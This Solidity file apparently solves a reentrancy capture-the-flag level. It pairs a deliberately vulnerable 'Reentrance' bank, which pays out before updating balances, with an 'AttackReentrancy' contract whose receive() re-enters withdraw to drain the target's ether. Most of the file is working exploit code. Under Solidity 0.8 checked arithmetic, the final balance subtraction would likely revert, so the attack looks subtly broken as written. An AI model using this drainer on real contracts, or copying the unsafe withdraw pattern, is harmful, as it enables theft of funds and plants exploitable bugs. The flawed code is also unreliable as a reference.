// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

interface IReentrant {
  function withdraw(uint _amount) external;
}

contract AttackReentrancy {

    IReentrant public reentrantContract;

    constructor (address _address) payable {
        reentrantContract = IReentrant(_address);
    }

    function attack () public {
        reentrantContract.withdraw(0.001 ether);
    }
    
    receive() external payable {
        if(address(reentrantContract).balance > 0){
            reentrantContract.withdraw(0.001 ether);
        }  
    }

}
